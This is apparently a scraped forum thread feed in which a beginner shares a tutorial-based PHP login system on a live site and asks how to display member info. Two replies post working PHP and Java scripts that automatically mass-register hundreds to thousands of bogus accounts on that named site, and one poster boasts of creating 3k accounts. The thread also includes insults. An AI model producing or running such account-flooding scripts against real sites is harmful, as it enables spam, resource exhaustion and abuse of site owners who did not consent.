channel.title: Cool Login System [(>>NEED HELP<<)]
channel.description:
I read a tutorial and tried to make this login system, comment and rate =)
[url=http://www.acagames.ulmb.com/main.php]http://www.acagames.ulmb.com/main.php[/url]
[size=15pt]Credits:
[url=http://www.evolt.org/node/60384]http://www.evolt.org/node/60384[/url]

I need Some Help, How do I make pages show like member info, like Saying "You are signed in as (Username) and show a logout button for people

how about you make your own…

Why reinvent the wheel when its been made thousands of times I would, of course, go into the code and modify it and learn from it, but I have a lot of work to do with the website, and downloading a php login script would save a fuck load of time.[/quote]

A login script takes hardly any time to do yourself compared to making a good PHP site, and of course a good start would be with the fundamentals.

@Tenac wrote:

I see some people here saying some of the flaws of this login method and how to get around it, but what I would rather hear are ways to fix these problems, I’m interested in maybe using this for my website, but after hearing all the holes in this system, I feel like I should fix them before using this.

Is there a better login script that I should download, or use this and do research into ways to improve this?

@lordbost wrote:

Retard…

AnthonyA12:

I need Some Help, How do I make pages show like member info, like Saying "You are signed in as (Username) and show a logout button for people

I bet you can reuse some of the code.

I have no idea how to do this, just looked quick through the code you used from http://www.evolt.org/node/60384

[code] <?
/**

  • User has already logged in, so display relevant links, including
  • a link to the admin center if the user is an administrator.
    */
    if($session->logged_in){
    echo “

    Logged In

    ”;
    echo “Welcome $session->username, you are logged in.

    "
    .”[<a href=“userinfo.php?user=$session->username”>My Account] "
    ."[<a href=“useredit.php”>Edit Account] ";
    if($session->isAdmin()){
    echo "[<a href=“admin/admin.php”>Admin Center] ";
    }
    echo “[<a href=“process.php”>Logout]”;
    }
    else{
    ?>[/code]

You are right, I did use that tutorial, and I didnt just copy it all, I went through it learning about all of it, I dont just copy from people and take the credit, I try to learn, and since I broke my leg the other day from my skateboard, I have all the time in the world now to learn

item.title: Cool Login System [(>>NEED HELP<<)]
item.dc:creator: @imjohn10 imjohn10
item.description:
@imjohn10 wrote:

[code]<?php
set_time_limit(0);

for ($i=1;$i<=1000;$i++) {
$user = randStr(10);
registerUser($user);
echo $i.’) '.$user.PHP_EOL;
}

function randStr($len) {
$chars = ‘abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789’;
$str = ‘’;

for ($i=0; $i<$len; $i++) {
	$str .= $chars[rand(0, strlen($chars))];
}

return $str;

}

function registerUser($user) {
$ch = curl_init(‘http://www.acagames.ulmb.com/process.php’);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_REFERER, ‘http://www.acagames.ulmb.com/register.php’);
curl_setopt($ch, CURLOPT_COOKIE, ‘PHPSESSID=1; referer_ok=1; stitialcookie_s=loaded; gs_show=1;’);
curl_setopt($ch, CURLOPT_POSTFIELDS, ‘user=’.$user.’&pass=asdfghjkl&email=’.$user.’@hotmail.com&subjoin=1’);
curl_exec($ch);
curl_close($ch);
}

?>[/code]

The code abraham posted is probably much faster than mine.

Read full topic

item.title: Cool Login System [(>>NEED HELP<<)]
item.dc:creator: @abraham2119 abraham2119
item.description:
@abraham2119 wrote:

how do you like your 3k accounts? ;D

[code]import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLConnection;
import java.util.List;
import java.util.Map;

class Main {

private static String getCookies() throws Exception {
	String cookies = "";
	URLConnection url = new URI("http://www.acagames.ulmb.com/register.php").toURL().openConnection();
	url.connect();

	Map<String, List<String>> headers = url.getHeaderFields();
	for (String s : headers.get("Set-Cookie")) {
		String[] split = s.split(";");
		for (int i = 0; i < (split.length - 1); i++) {
			cookies = split[i] + "; " + cookies;
		}
	}
	return cookies.substring(0, cookies.length() - 2);
}

private static String genUser(int length) {
	String user = "";
	for (int i = 0; i < length; i++) {
		user += (char) (97 + Math.random() * (122 - 97));
	}
	return user;
}

public static void main(String[] args) {
	try {
		String cookies = getCookies() + "; gs_show=1"; /*gs_show is a cookie which every site pertaining to ulmb sets*/
		String user = genUser(10);
		for (int i = 0; i < 100; i++) {
                    	String s = "user="+ user + i +"&pass=password&email=" + user + i +"%40live.com&subjoin=1";
			HttpURLConnection http = (HttpURLConnection) new URI("http://www.acagames.ulmb.com/process.php").toURL().openConnection();
			http.setRequestMethod("POST");
			http.setRequestProperty("Content-Length", "" + s.length());
			http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			http.setRequestProperty("Referer", "http://www.acagames.ulmb.com/register.php");
			http.setRequestProperty("Cookie", cookies);
			http.setDoOutput(true);
			http.setDoInput(true);
			System.out.println("username: " + (user + i) + "\tconnection: " + (i + 1));

				http.connect();
			http.getOutputStream().write(s.getBytes());
			http.getInputStream(); /*inputstream is parsed = redirect (if applicable - in this case it is)*/
		}
	} catch(Exception e) { 
		e.printStackTrace(); 
	}
}

}[/code]

Read full topic
